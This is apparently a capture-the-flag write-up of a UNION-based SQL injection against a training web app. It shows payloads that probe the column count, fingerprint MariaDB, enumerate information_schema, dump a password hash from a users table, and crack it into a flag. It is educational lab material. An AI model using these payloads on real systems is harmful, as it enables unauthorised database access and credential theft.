### Challenge

I tested several types of injections from this list: https://github.com/payloadbox/sql-injection-payload-list, and then I started trying UNION attacks.

Payload: `1 UNION SELECT 1`
Response: `The used SELECT statements have a different number of columns`

We have two columns:
```
1 UNION SELECT null,null

ID: 1 UNION SELECT null,null 
First name: one
Surname: me
ID: 1 UNION SELECT null,null 
First name: 
Surname:
```

We're likely dealing with `MySQL` because sleep(10) works. Indeed, a union select version adapted to MySQL and Microsoft works:

```
1 UNION SELECT NULL,@@version

ID: 1 UNION SELECT NULL,@@version 
First name: one
Surname: me
ID: 1 UNION SELECT NULL,@@version 
First name: 
Surname: 5.5.64-MariaDB-1ubuntu0.14.04.1
```

On sait donc qu’on a une database Member_Sql_Injection avec une table users
```
1 UNION SELECT * from clauses

response : Table 'Member_Sql_Injection.clauses' doesn't exist
```

We can see there's a user flag:

```
1 UNION SELECT first_name,null FROM users

ID: 1 UNION SELECT first_name,null FROM users 
First name: one
Surname: me
ID: 1 UNION SELECT first_name,null FROM users 
First name: one
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: two
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: three
Surname: 
ID: 1 UNION SELECT first_name,null FROM users 
First name: Flag
Surname:
```

With the documentation of information_schema.tables for mariadb, we can discover all schemas, tables, and columns : https://mariadb.com/kb/en/information-schema-tables-table/

Some examples of payloads to obtain more information:

```SQL
1 UNION SELECT table_name, table_schema FROM information_schema.tables # get table name and schema
1 UNION SELECT table_name, table_rows FROM information_schema.tables # name and rows
1 UNION SELECT table_name, column_name FROM information_schema.columns # All colunms of all tables
```

```SQL
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: username
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: db_default
Surname: password
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: user_id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: first_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: last_name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: town
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: country
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: planet
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: Commentaire
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: users
Surname: countersign
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: id_comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: guestbook
Surname: name
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: id
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: url
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: title
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: list_images
Surname: comment
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: id_vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: nb_vote
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns
First name: vote_dbs
Surname: subject
```

Okay, here's a summary:

We are in a MySQL database: 5.5.64-MariaDB-1ubuntu0.14.04.1
Database: Member_Sql_Injection

- DB: Member_Sql_Injection
- table: users

- DB: Member_Brute_Force ← Probably for another challenge
- table: db_default

- DB: Member_guestbook
- table: guestbook

- DB: Member_images
- table: list_images

- DB: vote_dbs
- table: survey


On the "users" table, you can retrieve the missing information and with this, the password!
```
ID: 1 UNION SELECT countersign, Commentaire FROM users
First name: 5ff9d0165b4f92b14994e5c685cdce28
Surname: Decrypt this password -> then lower all the characters. SHA256 on it and it's good!
```

Following the comment, we retrieve the password which turns out to be MD5, with the password being `FortyTwo`: https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28
We lowercase the password: `fortytwo`

This results in:
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
And therefore, a 64-character string that is the flag!



### Ressources
- https://crashtest-security.com/sql-injection-union/
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://mariadb.com/kb/en/information-schema-tables-table/
